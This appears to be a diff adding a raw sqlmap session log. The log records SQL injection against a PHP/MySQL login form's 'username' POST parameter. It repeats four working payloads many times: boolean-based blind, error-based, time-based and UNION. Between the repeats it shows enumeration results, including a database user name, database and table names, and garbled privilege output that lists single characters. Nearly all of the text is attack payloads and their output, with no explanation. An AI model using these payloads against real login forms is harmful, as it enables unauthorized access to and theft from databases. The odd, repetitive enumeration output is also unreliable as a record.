+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP 8.3.9, Apache 2.4.62, PHP
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP, PHP 8.3.9
+back-end DBMS: MySQL 8
+current user: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP 8.3.9, Apache 2.4.62, PHP
+back-end DBMS: MySQL 8
+Database: db1
+Table: studenci
+[2 entries]
++----------+
+| users    |
++----------+
+| users    |
+| studenci |
++----------+
+
+Database: db1
+Table: users
+[2 entries]
++----------+
+| users    |
++----------+
+| users    |
+| studenci |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+database management system users privileges:
+[*] '
+[*] 1
+[*] 2
+[*] 3
+[*] @
+[*] a
+[*] c
+[*] D
+[*] e
+[*] h
+[*] i
+[*] k
+[*] l
+[*] n
+[*] o
+[*] s
+[*] t
+[*] z
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, Apache 2.4.62, PHP 8.3.9
+back-end DBMS: MySQL 8
+database management system users [1]:
+[*] 'Dziekan123'@'localhost'
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP, PHP 8.3.9
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL 8
+Database: db1
+Table: db1
+[3 entries]
++--------------------+
+| information_schema |
++--------------------+
+| information_schema |
+| db1                |
+| test               |
++--------------------+
+
+Database: db1
+Table: test
+[3 entries]
++--------------------+
+| information_schema |
++--------------------+
+| information_schema |
+| db1                |
+| test               |
++--------------------+
+
+Database: db1
+Table: information_schema
+[3 entries]
++--------------------+
+| information_schema |
++--------------------+
+| information_schema |
+| db1                |
+| test               |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP, PHP 8.3.9
+back-end DBMS: MySQL 8
